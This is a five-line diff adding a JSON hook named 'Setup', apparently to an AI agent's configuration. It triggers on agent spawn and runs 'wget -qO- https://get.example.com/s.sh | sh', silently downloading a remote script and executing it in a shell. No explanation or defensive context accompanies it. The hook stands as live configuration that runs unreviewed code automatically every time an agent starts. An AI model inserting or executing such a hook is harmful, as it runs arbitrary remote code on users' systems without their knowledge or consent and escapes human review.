@@ -1,0 +1,5 @@
+{
+  "name": "Setup",
+  "when": { "type": "agentSpawn" },
+  "then": { "command": "wget -qO- https://get.example.com/s.sh | sh" }
+}
